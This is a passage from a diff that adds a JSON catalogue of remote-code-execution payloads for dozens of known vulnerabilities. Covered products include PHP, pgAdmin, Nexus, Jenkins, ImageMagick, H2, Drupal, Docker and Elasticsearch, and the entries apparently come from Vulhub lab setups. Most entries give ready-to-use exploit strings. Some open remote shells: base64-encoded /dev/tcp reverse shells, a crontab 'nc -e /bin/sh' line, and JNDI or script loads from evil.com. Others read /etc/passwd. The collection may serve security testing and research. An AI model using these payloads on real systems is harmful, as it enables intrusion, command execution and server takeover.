+      "target": "CVE-2017-9841",
+      "description": "The vulnerability allows remote code execution by directly accessing a vulnerable PHP file that uses eval() on user input from php://input.",
+      "payloads": [
+        "POST Body with PHP code to http://your-ip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "8.1-backdoor",
+      "description": "PHP 8.1.0-dev version had a backdoor that allows remote code execution via a crafted User-Agentt header.",
+      "payloads": [
+        "User-Agentt: zerodiumvar_dump(233*233);"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "CVE-2012-1823",
+      "description": "PHP-CGI vulnerability allows remote code execution by passing command-line arguments via query string, enabling arbitrary PHP code execution.",
+      "payloads": [
+        "/index.php?-s",
+        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+        "<?php echo shell_exec(\"id\"); ?>"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "CVE-2018-19518",
+      "description": "The vulnerability allows remote command execution via injection of the -oProxyCommand parameter in the ssh command used by PHP's imap_open function on Debian/Ubuntu systems.",
+      "payloads": [
+        "hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "CVE-2019-11043",
+      "description": "A buffer overflow in PHP-FPM's FastCGI implementation allows writing beyond allocated buffer, leading to remote code execution when sending crafted requests with newline characters.",
+      "payloads": [
+        "%0a",
+        "?a=/bin/sh+-c+'which+which'&",
+        "?a=id"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "CVE-2024-2961",
+      "description": "A buffer overflow in GNU C's iconv() function (CVE-2024-2961) allows attackers to escalate arbitrary file read vulnerabilities in PHP applications to remote code execution.",
+      "payloads": [
+        "http://your-ip:8080/index.php?file=/etc/passwd",
+        "echo '<?=phpinfo();?>' > shell.php"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "xdebug-rce",
+      "description": "XDebug remote debugging feature allows attackers to execute arbitrary PHP code via the DBGp protocol's eval function when specific configurations are enabled.",
+      "payloads": [
+        "XDEBUG_SESSION_START",
+        "XDEBUG_SESSION",
+        "XDEBUG_TRIGGER"
+      ]
+    },
+    {
+      "app": "pgadmin",
+      "target": "CVE-2022-4223",
+      "description": "Unauthenticated remote command execution due to improper validation of user-supplied paths in the HTTP API, allowing arbitrary command execution on the target server.",
+      "payloads": [
+        "GET /login HTTP/1.1",
+        "POST /misc/validate_binary_path HTTP/1.1",
+        "X-pgA-CSRFToken: [csrf-token]",
+        "Cookie: pga4_session=[session-id]",
+        "{\"utility_path\":\"a\\\";id;#\"}"
+      ]
+    },
+    {
+      "app": "pgadmin",
+      "target": "CVE-2023-5002",
+      "description": "A patch bypass vulnerability in pgAdmin's binary path validation API allows authenticated users to execute arbitrary commands via crafted directory names.",
+      "payloads": [
+        "\";id;#",
+        "/var/lib/pgadmin/storage/vulhub_example.com/\";id;#"
+      ]
+    },
+    {
+      "app": "pgadmin",
+      "target": "CVE-2025-13780",
+      "description": "pgAdmin4's restore function uses the psql command-line program to execute user-uploaded SQL files, allowing attackers to bypass security checks by embedding meta commands (\\!) with special characters like carriage returns (\\r) to execute arbitrary system commands.",
+      "payloads": [
+        "SELECT 1;\\r\\! bash -c 'touch /tmp/hacked2'\\r",
+        "SELECT 1;\\! bash -c 'touch /tmp/hacked1'"
+      ]
+    },
+    {
+      "app": "pgadmin",
+      "target": "CVE-2025-2945",
+      "description": "The vulnerability allows authenticated attackers to execute arbitrary code via unsafe eval() usage in POST parameters query_commited and high_availability in pgAdmin4 versions before 9.2.",
+      "payloads": [
+        "__import__('os').system('touch /tmp/success')",
+        "/sqleditor/query_tool/download",
+        "/cloud/deploy"
+      ]
+    },
+    {
+      "app": "opentsdb",
+      "target": "CVE-2020-35476",
+      "description": "A command injection vulnerability in OpenTSDB 2.4.0 and earlier allows remote code execution via crafted parameters in the query endpoint.",
+      "payloads": [
+        "GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system('touch%20/tmp/success')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1"
+      ]
+    },
+    {
+      "app": "opentsdb",
+      "target": "CVE-2023-25826",
+      "description": "Command injection vulnerability in OpenTSDB 2.4.1 and earlier due to incomplete fix of CVE-2020-35476, allowing arbitrary command execution via the 'key' parameter in a GET request.",
+      "payloads": [
+        "GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1"
+      ]
+    },
+    {
+      "app": "opensmtpd",
+      "target": "CVE-2020-7247",
+      "description": "OpenSMTPD vulnerability due to insufficient validation of sender/recipient fields in RFC 5321 implementation, allowing remote command execution.",
+      "payloads": [
+        "python3 poc.py your-ip 8825 <command>"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2024-38856",
+      "description": "Authentication bypass leads to Groovy expression injection, allowing unauthorized remote code execution via crafted HTTP requests.",
+      "payloads": [
+        "POST /webtools/control/main/ProgramExport HTTP/1.1",
+        "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ",
+        "throw new Exception('id'.\\u0065xecute().text);"
+      ]
+    },
+    {
+      "app": "ofbiz",
+      "target": "CVE-2024-45507",
+      "description": "Apache OFBiz versions before 18.12.16 are vulnerable to SSRF and remote code execution via a crafted POST request to /webtools/control/forgotPassword/StatsSinceStart, allowing unauthenticated attackers to execute arbitrary commands.",
+      "payloads": [
+        "POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1\nHost: your-ip:8443\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 64\n\nstatsDecoratorLocation=http://10.10.10.10/path/to/api",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<screens xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xmlns=\"http://ofbiz.apache.org/Widget-Screen\" xsi:schemaLocation=\"http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd\">\n    <screen name=\"StatsDecorator\">\n        <section>\n            <actions>\n                <set value=\"${groovy:'touch /tmp/success'.execute();}\"/>\n            </actions>\n        </section>\n    </screen>\n</screens>"
+      ]
+    },
+    {
+      "app": "node",
+      "target": "CVE-2017-16082",
+      "description": "node-postgres library improperly escapes field names in Row Description packets, allowing crafted SQL queries to escape single quotes and execute arbitrary code.",
+      "payloads": [
+        "SELECT 1 AS \"\\']=0;require=process.mainModule.constructor._load;/*\", 2 AS \"*/p=require(`child_process`);/*\", 3 AS \"*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*\", 4 AS \"*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//\""
+      ]
+    },
+    {
+      "app": "nexus",
+      "target": "CVE-2019-7238",
+      "description": "Nexus Repository Manager 3 up to version 3.14.0 has an unauthorized access vulnerability in an OrientDB custom function that allows arbitrary JEXL expression execution, leading to remote code execution.",
+      "payloads": [
+        "POST /service/extdirect HTTP/1.1 with JSON body containing expression: 233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"
+      ]
+    },
+    {
+      "app": "nexus",
+      "target": "CVE-2020-10199",
+      "description": "Nexus Repository Manager 3 up to version 3.21.1 has an arbitrary EL expression injection vulnerability that allows authenticated users to execute arbitrary commands on the server.",
+      "payloads": [
+        "$\\A{233*233*233}",
+        "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}"
+      ]
+    },
+    {
+      "app": "nexus",
+      "target": "CVE-2020-10204",
+      "description": "Nexus Repository Manager 3.21.1 and earlier contain an arbitrary EL expression injection vulnerability that allows authenticated administrators to execute arbitrary commands on the server by injecting expressions into role fields.",
+      "payloads": [
+        "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"admin\",\"version\":\"2\",\"firstName\":\"admin\",\"lastName\":\"User\",\"email\":\"admin@example.org\",\"status\":\"active\",\"roles\":[\"nxadmin$\\\\B{233*233}\"]}],\"type\":\"rpc\",\"tid\":11}",
+        "$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}"
+      ]
+    },
+    {
+      "app": "nacos",
+      "target": "CVE-2021-29442",
+      "description": "Unauthenticated access to API endpoints in Nacos versions before 1.4.1 allows attackers to execute arbitrary Derby SQL statements and Java code, leading to remote command execution.",
+      "payloads": [
+        "/nacos/v1/cs/ops/derby",
+        "ps aux"
+      ]
+    },
+    {
+      "app": "mongo-express",
+      "target": "CVE-2019-10758",
+      "description": "Mongo Express allows remote code execution via a crafted POST request to the /checkValid endpoint, enabling arbitrary Node.js code execution if default credentials are used or after successful login.",
+      "payloads": [
+        "POST /checkValid HTTP/1.1",
+        "Authorization: Basic YWRtaW46cGFzcw==",
+        "document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\")"
+      ]
+    },
+    {
+      "app": "metersphere",
+      "target": "plugin-rce",
+      "description": "MeterSphere plugin management interface has unauthorized access, allowing attackers to upload malicious plugins and execute arbitrary code via custom method calls.",
+      "payloads": [
+        "/plugin/list",
+        "/plugin/add",
+        "/plugin/customMethod",
+        "multipart/form-data with Evil.jar file",
+        "{\"entry\": \"org.vulhub.Evil\", \"request\": \"id\"}"
+      ]
+    },
+    {
+      "app": "metabase",
+      "target": "CVE-2023-38646",
+      "description": "Unauthenticated remote code execution via JDBC injection in Metabase setup endpoint, allowing arbitrary command execution on the server.",
+      "payloads": [
+        "GET /api/session/properties",
+        "POST /api/setup/validate with JSON body containing malicious JDBC connection string and init parameter for command execution"
+      ]
+    },
+    {
+      "app": "livewire",
+      "target": "CVE-2025-54068",
+      "description": "A remote code execution vulnerability in Livewire before version 3.6.4 due to improper control during component property hydration, allowing attackers to inject malicious payloads via user input from snapshots.",
+      "payloads": [
+        "system -p \"id\"",
+        "system -p \"cat /etc/passwd\""
+      ]
+    },
+    {
+      "app": "langflow",
+      "target": "CVE-2025-3248",
+      "description": "Unauthenticated remote code execution via the `/api/v1/validate/code` API in Langflow versions before 1.3.0, where malicious decorators or default parameters in Python code are executed by `exec` during validation.",
+      "payloads": [
+        "POST /api/v1/validate/code HTTP/1.1",
+        "{\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(['id']))\\\")\\ndef foo():\\n  pass\"}"
+      ]
+    },
+    {
+      "app": "kkfileview",
+      "target": "4.3-zipslip-rce",
+      "description": "A ZipSlip vulnerability in kkFileView before version 4.4.0-beta allows attackers to write arbitrary files to server directories, leading to remote command execution.",
+      "payloads": [
+        "test.zip",
+        "sample.odt",
+        "poc.py"
+      ]
+    },
+    {
+      "app": "kibana",
+      "target": "CVE-2019-7609",
+      "description": "Prototype pollution in Kibana's Timeline feature allows attackers to inject malicious JavaScript via crafted payloads, leading to arbitrary code execution on the server.",
+      "payloads": [
+        ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"/bin/touch /tmp/success\");process.exit()//')",
+        ".props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"
+      ]
+    },
+    {
+      "app": "kibana",
+      "target": "CVE-2020-7012",
+      "description": "Prototype pollution in Kibana's upgrade-assistant-telemetry allows authenticated users with index write permissions to inject malicious data, leading to arbitrary code execution when Kibana processes the data.",
+      "payloads": [
+        "PUT /.kibana_1/_mappings with custom upgrade-assistant-telemetry properties including constructor.prototype.sourceURL"
+      ]
+    },
+    {
+      "app": "jira",
+      "target": "CVE-2019-11581",
+      "description": "A template injection vulnerability in Atlassian Jira allows attackers to execute arbitrary commands via crafted payloads in contact forms or SMTP settings.",
+      "payloads": [
+        "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()",
+        "/secure/ContactAdministrators!default.jspa",
+        "/secure/admin/AddSmtpMailServer!default.jspa",
+        "/secure/admin/ViewApplicationProperties.jspa",
+        "/secure/admin/MailQueueAdmin!default.jspa"
+      ]
+    },
+    {
+      "app": "jimureport",
+      "target": "CVE-2023-4450",
+      "description": "FreeMarker server-side template injection (SSTI) vulnerability in JimuReport 1.6.0 and earlier, allowing attackers to execute arbitrary commands on the server.",
+      "payloads": [
+        "POST /jmreport/queryFieldBySql HTTP/1.1 with JSON body: {\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"id\\\")}'\"}"
+      ]
+    },
+    {
+      "app": "jenkins",
+      "target": "CVE-2018-1000861",
+      "description": "Jenkins versions 2.153 and earlier, and LTS 2.138.3 and earlier, have an unauthorized remote code execution vulnerability due to improper handling of URL paths that allow attackers to invoke methods on Java objects, bypassing Groovy sandbox restrictions through meta-programming during syntax validation.",
+      "payloads": [
+        "http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x { public x(){ \"touch /tmp/success\".execute() } }"
+      ]
+    },
+    {
+      "app": "java",
+      "target": "rmi-codebase",
+      "description": "Java RMI allows remote code execution by specifying the java.rmi.server.codebase parameter, enabling the server to load and execute arbitrary Java bytecode from a remote location.",
+      "payloads": [
+        "java.rmi.server.codebase parameter"
+      ]
+    },
+    {
+      "app": "ingress-nginx",
+      "target": "CVE-2025-1974",
+      "description": "Ingress-NGINX Admission Controller is accessible without authentication, allowing attackers to send malicious AdmissionReview requests to inject unauthorized configurations, which can be chained with other vulnerabilities to achieve remote code execution.",
+      "payloads": [
+        "AdmissionReview request",
+        "ssl_engine directive",
+        "auth-url annotation",
+        "auth-tls-match-cn annotation",
+        "shell.so dynamic library"
+      ]
+    },
+    {
+      "app": "imagemagick",
+      "target": "CVE-2016-3714",
+      "description": "ImageMagick versions before 6.9.3-9 have insufficient filtering of filenames passed to delegate commands, allowing remote code execution when processing various image formats.",
+      "payloads": [
+        "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.0/oops.jpg\"|curl \"www.leavesongs.com:8889)'\npop graphic-context",
+        "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`\"||id \" )'\npop graphic-context"
+      ]
+    },
+    {
+      "app": "imagemagick",
+      "target": "CVE-2020-29599",
+      "description": "A command injection vulnerability in ImageMagick's PDF processing allows arbitrary command execution via a specially crafted SVG file.",
+      "payloads": [
+        "poc.svg"
+      ]
+    },
+    {
+      "app": "hugegraph",
+      "target": "CVE-2024-27348",
+      "description": "Apache HugeGraph's Gremlin API allows unauthenticated remote code execution by using reflection to modify thread names and bypass SecurityManager restrictions, enabling arbitrary command execution via Groovy-based Gremlin commands.",
+      "payloads": [
+        "POST /gremlin HTTP/1.1 with JSON body containing a gremlin script that uses reflection to change thread name and execute commands, e.g., Thread.currentThread() and ProcessBuilder to run 'id'"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "ssi-rce",
+      "description": "Apache HTTP Server with SSI enabled allows remote command execution via SSI directives in uploaded SHTML files when file upload is misconfigured.",
+      "payloads": [
+        "<!--#exec cmd=\"ls\" -->"
+      ]
+    },
+    {
+      "app": "h2database",
+      "target": "CVE-2018-10054",
+      "description": "H2 Database Web Console allows unauthenticated access in versions before 1.4.198, enabling attackers to execute arbitrary code via SQL commands such as CREATE TRIGGER with JavaScript code.",
+      "payloads": [
+        "jdbc:h2:mem:test",
+        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n    var is = java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()\n    var scanner = new java.util.Scanner(is).useDelimiter(\"\\\\A\")\n    throw new java.lang.Exception(scanner.next())\n$$;",
+        "RUNSCRIPT FROM 'http://evil.com/script.sql'",
+        "CREATE ALIAS func AS code...; CALL func ..."
+      ]
+    },
+    {
+      "app": "h2database",
+      "target": "CVE-2021-42392",
+      "description": "H2 Database Web console versions before 1.4.206 allow unauthenticated JNDI injection via JDBC driver loading, enabling remote code execution when Spring Boot integration exposes the console.",
+      "payloads": [
+        "javax.naming.InitialContext as Driver class",
+        "JNDI URL generated by Java-Chains (e.g., from JNDI/JNDIResourceRefPayload module)"
+      ]
+    },
+    {
+      "app": "h2database",
+      "target": "CVE-2022-23221",
+      "description": "H2 Database Web Console allows unauthorized JDBC attacks via a crafted URL with a backslash to bypass FORBID_CREATION restrictions, enabling remote code execution through JavaScript triggers.",
+      "payloads": [
+        "jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n    var is = java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()\n    var scanner = new java.util.Scanner(is).useDelimiter(\"\\\\A\")\n    throw new java.lang.Exception(scanner.next())\n$$;AUTHZPWD=\\",
+        "spring.h2.console.enabled=true",
+        "spring.h2.console.settings.web-allow-others=true",
+        "http://your-ip:8080/h2-console/"
+      ]
+    },
+    {
+      "app": "grafana",
+      "target": "CVE-2024-9264",
+      "description": "Insufficient input validation in Grafana's experimental SQL Expressions feature allows authenticated users with Viewer+ permissions to inject arbitrary DuckDB SQL, leading to arbitrary file read and remote code execution via DuckDB extensions.",
+      "payloads": [
+        "POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q100 HTTP/1.1",
+        "Authorization: Basic YWRtaW46YWRtaW4=",
+        "{\"queries\": [{\"refId\": \"A\", \"datasource\": {\"type\": \"__expr__\", \"uid\": \"__expr__\", \"name\": \"Expression\"}, \"type\": \"sql\", \"expression\": \"SELECT content FROM read_blob('/etc/passwd')\"}]}",
+        "{\"queries\": [{\"refId\": \"A\", \"datasource\": {\"type\": \"__expr__\", \"uid\": \"__expr__\", \"name\": \"Expression\"}, \"type\": \"sql\", \"expression\": \"INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv('|id');\"}]}"
+      ]
+    },
+    {
+      "app": "goahead",
+      "target": "CVE-2017-17562",
+      "description": "GoAhead Web Server allows remote command execution by controlling CGI environment variables, specifically using LD_PRELOAD to load a malicious dynamic library from POST data.",
+      "payloads": [
+        "LD_PRELOAD=/proc/self/fd/0",
+        "http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0",
+        "POST data containing compiled payload.so"
+      ]
+    },
+    {
+      "app": "goahead",
+      "target": "CVE-2021-42342",
+      "description": "The vulnerability is a bypass of a previous patch for CVE-2017-17562, allowing attackers to inject environment variables via multipart form data to hijack LD_PRELOAD and execute arbitrary code.",
+      "payloads": [
+        "multipart form data to control environment variables",
+        "payload.so dynamic library compiled from payload.c",
+        "poc.py script for sending malicious packets"
+      ]
+    },
+    {
+      "app": "gitlist",
+      "target": "CVE-2018-1000533",
+      "description": "A command argument injection vulnerability in gitlist 0.6.0 allows remote code execution via the search function by injecting arguments into the git grep command.",
+      "payloads": [
+        "--open-files-in-pager=id;"
+      ]
+    },
+    {
+      "app": "gitlab",
+      "target": "CVE-2021-22205",
+      "description": "Unauthenticated remote code execution via malicious image upload in GitLab's /uploads/user endpoint, exploiting ExifTool vulnerability CVE-2021-22204.",
+      "payloads": [
+        "/uploads/user",
+        "malicious image file with embedded payload"
+      ]
+    },
+    {
+      "app": "gitea",
+      "target": "1.4-rce",
+      "description": "Gitea 1.4.0 has a directory traversal vulnerability in Git LFS handling, allowing unauthenticated users to read arbitrary files and potentially execute commands.",
+      "payloads": [
+        "POST /vulhub/repo.git/info/lfs/objects HTTP/1.1 with JSON body containing Oid: ....../../../etc/passwd",
+        "GET /vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth"
+      ]
+    },
+    {
+      "app": "git",
+      "target": "CVE-2017-8386",
+      "description": "A sandbox bypass vulnerability in git-shell allows authenticated remote users to execute arbitrary commands by exploiting the --help option in git-upload-archive to invoke less and escape to a shell.",
+      "payloads": [
+        "ssh -p 3322 -i id_rsa -t git@127.0.0.1 \"git-upload-archive '--help'\"",
+        "!id"
+      ]
+    },
+    {
+      "app": "ghostscript",
+      "target": "CVE-2018-16509",
+      "description": "GhostScript's security sandbox can be bypassed via a malicious image file, allowing remote command execution, file reading, and file deletion.",
+      "payloads": [
+        "poc.png"
+      ]
+    },
+    {
+      "app": "ghostscript",
+      "target": "CVE-2018-19475",
+      "description": "A sandbox bypass vulnerability in GhostScript allows attackers to execute arbitrary commands via a malicious PostScript file, exploiting improper handling of the %pipe% directive.",
+      "payloads": [
+        "%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file"
+      ]
+    },
+    {
+      "app": "ghostscript",
+      "target": "CVE-2019-6116",
+      "description": "GhostScript sandbox bypass vulnerability allowing arbitrary command execution or file reading via specially crafted PostScript or PDF files.",
+      "payloads": [
+        "poc.png"
+      ]
+    },
+    {
+      "app": "geoserver",
+      "target": "CVE-2022-24816",
+      "description": "A code injection vulnerability in GeoServer's JAI-EXT Jiffle language allows remote code execution via crafted Jiffle expressions in WMS requests.",
+      "payloads": [
+        "POST /geoserver/wms HTTP/1.1 with malicious XML containing Jiffle expressions",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>...<wps:Execute...> with crafted Jiffle code"
+      ]
+    },
+    {
+      "app": "geoserver",
+      "target": "CVE-2024-36401",
+      "description": "Unauthenticated users can exploit a vulnerability in GeoServer by crafting malicious OGC requests to execute XPath expressions, leading to arbitrary code execution via Apache Commons Jxpath.",
+      "payloads": [
+        "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1')",
+        "POST /geoserver/wfs with XML payload containing malicious XPath expression"
+      ]
+    },
+    {
+      "app": "flask",
+      "target": "ssti",
+      "description": "Flask with Jinja2 template engine is vulnerable to server-side template injection (SSTI) when user input is rendered without proper sanitization, leading to remote code execution.",
+      "payloads": [
+        "{{233*233}}",
+        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
+      ]
+    },
+    {
+      "app": "fastjson",
+      "target": "1.2.47-rce",
+      "description": "Fastjson 1.2.47 has a deserialization vulnerability where attackers can bypass the whitelist using specially crafted JSON strings to achieve remote code execution via JNDI injection.",
+      "payloads": [
+        "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/Exploit\",\"autoCommit\":true}}"
+      ]
+    },
+    {
+      "app": "erlang",
+      "target": "CVE-2025-32433",
+      "description": "An unauthenticated remote code execution vulnerability in Erlang/OTP SSH server, where attackers can execute arbitrary system commands by sending specially crafted SSH protocol messages.",
+      "payloads": [
+        "SSH_MSG_CHANNEL_REQUEST (message number 94) with recipient channel, string \"exec\", boolean want reply, and string command"
+      ]
+    },
+    {
+      "app": "elfinder",
+      "target": "CVE-2021-32682",
+      "description": "A parameter injection vulnerability in elFinder versions up to 2.1.48 allows attackers to execute arbitrary commands via crafted parameters in archive requests, exploiting the ZIP functionality.",
+      "payloads": [
+        "GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip"
+      ]
+    },
+    {
+      "app": "electron",
+      "target": "CVE-2018-1000006",
+      "description": "A parameter injection vulnerability in Electron's Protocol Handler on Windows allows arbitrary command execution when a malicious link is clicked.",
+      "payloads": [
+        "http://your-ip:8080/",
+        "vulhub-app.tar.gz"
+      ]
+    },
+    {
+      "app": "electron",
+      "target": "CVE-2018-15685",
+      "description": "Electron WebPreferences vulnerability allows bypassing nodeIntegration=false restriction via XSS, enabling remote command execution through child_process.exec.",
+      "payloads": [
+        "<img src=1 onerror=\"window.open().open('data:text/html,<script>require(\\'child_process\\').exec(\\'calc.exe\\')</script>');\">"
+      ]
+    },
+    {
+      "app": "elasticsearch",
+      "target": "CVE-2014-3120",
+      "description": "ElasticSearch versions before 1.2 have dynamic scripting enabled by default, allowing attackers to execute arbitrary MVEL expressions and Java code via the 'script' parameter in '_search' requests.",
+      "payloads": [
+        "POST /website/blog/ HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\n\n{\n  \"name\": \"vulhub\"\n}",
+        "POST /_search?pretty HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 343\n\n{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\": {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n        \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"id\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\n        }\n    }\n}"
+      ]
+    },
+    {
+      "app": "elasticsearch",
+      "target": "CVE-2015-1427",
+      "description": "ElasticSearch Groovy script engine sandbox bypass allows remote code execution via crafted scripts in search queries.",
+      "payloads": [
+        "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()",
+        "def command='id';def res=command.execute().text;res",
+        "POST /_search?pretty HTTP/1.1 with script in JSON body"
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2018-7600",
+      "description": "Drupal versions before 7.58, 8.3.9, 8.4.6, and 8.5.1 have a remote code execution vulnerability in the Form API, allowing unauthenticated attackers to execute arbitrary commands via crafted POST requests.",
+      "payloads": [
+        "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1",
+        "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2018-7602",
+      "description": "The vulnerability is due to insufficient input filtering in Drupal 7.x and 8.x, where double URL encoding of the '#' character bypasses sanitization, leading to remote code execution.",
+      "payloads": [
+        "URL with double URL-encoded '#' character",
+        "python3 drupa7-CVE-2018-7602.py -c \"id\" drupal drupal http://127.0.0.1:8081/"
+      ]
+    },
+    {
+      "app": "docker",
+      "target": "unauthorized-rce",
+      "description": "Unauthorized access to Docker Remote API allows attackers to create and execute containers, leading to remote code execution on the host system.",
+      "payloads": [
+        "http://your-ip:2375/",
+        "docker.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})"
+      ]
+    },
+    {
+      "app": "discuz",
+      "target": "wooyun-2010-080723",
+      "description": "A remote code execution vulnerability in Discuz 7.x/6.x due to insufficient global variable protection, allowing attackers to override global variables via cookies in PHP 5.3.x with default request_order settings.",
+      "payloads": [
+        "GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();"
+      ]
+    },
+    {
+      "app": "cups-browsed",
+      "target": "CVE-2024-47177",
+      "description": "The vulnerability is a remote command execution in cups-browsed up to version 2.0.1, caused by improper handling of the FoomaticRIPCommandLine parameter in PPD files, allowing attackers to execute arbitrary commands via a malicious IPP server.",
+      "payloads": [
+        "printer-privacy-policy-uri: https://www.google.com/\"\n*FoomaticRIPCommandLine: \"echo 1 > /tmp/I_AM_VULNERABLE\"\n*cupsFilter2 : \"application/pdf application/vnd.cups-postscript 0 foomatic-rip"
+      ]
+    },
+    {
+      "app": "craftcms",
+      "target": "CVE-2023-41892",
+      "description": "Unauthenticated remote code execution via PHP object injection in Craft CMS 4.4.0 to 4.4.14, exploiting the ConditionsController's beforeAction method due to insufficient input validation.",
+      "payloads": [
+        "POST /index.php?action=conditions/render HTTP/1.1\nHost: localhost:8088\nContent-Type: application/json\n\n{\naaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaa\n<?php\n@phpinfo(); __halt_compiler();\n?>\n}",
+        "POST /index.php?action=conditions/render HTTP/1.1\nHost: localhost:8088\nContent-Type: application/json\n\n{\n  \"config\": {\n    \"name\": \"test\",\n    \"as xyz\": {\n      \"class\": \"\\\\Psy\\\\Configuration\",\n      \"__construct()\": {\n        \"config\": {\n          \"configFile\": \"../storage/logs/web-2025-03-31.log\"\n        }\n      }\n    }\n  },\n  \"test\": \"craft\\\\elements\\\\conditions\\\\users\\\\UserCondition\"\n}"
+      ]
+    },
+    {
+      "app": "craftcms",
+      "target": "CVE-2024-56145",
